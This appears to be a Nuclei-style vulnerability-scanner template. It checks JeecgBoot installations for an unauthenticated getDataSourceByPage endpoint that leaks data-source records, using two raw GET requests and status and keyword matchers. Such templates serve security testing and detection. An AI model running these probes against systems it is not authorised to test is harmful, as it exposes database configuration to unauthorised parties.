id: jeecgboot-getDataSourceByPage-leakage
info:
  name: jeecgboot-getDataSourceByPage-leakage
  author: lemonlove7
  severity: medium
flow: http(1) && http(2)
http:
  - raw:
      - |-
        GET /jeecg-boot/jmreport/getDataSourceByPage HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
        Accept: */*
        Connection: Keep-Alive
  - raw:
      - |-
        GET /jmreport/getDataSourceByPage HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
        Accept: */*
        Connection: Keep-Alive
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - success
          - records
    matchers-condition: and
